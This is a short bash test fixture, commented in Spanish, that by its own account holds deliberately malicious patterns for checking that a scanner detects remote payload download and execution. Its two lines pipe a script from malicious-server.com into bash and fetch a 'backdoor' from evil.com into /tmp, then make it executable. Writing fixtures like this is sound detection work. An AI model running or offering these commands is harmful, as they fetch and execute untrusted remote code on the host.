#!/bin/bash
# =========================================================
# ARCHIVO DE PRUEBA - Payloads Remotos (descarga + ejecución)
# Este archivo contiene patrones maliciosos a propósito
# para validar que el escáner los detecta correctamente.
# =========================================================

# Patrón 1: curl pipe a bash
curl http://malicious-server.com/payload.sh | bash

# Patrón 2: wget + chmod +x
wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor
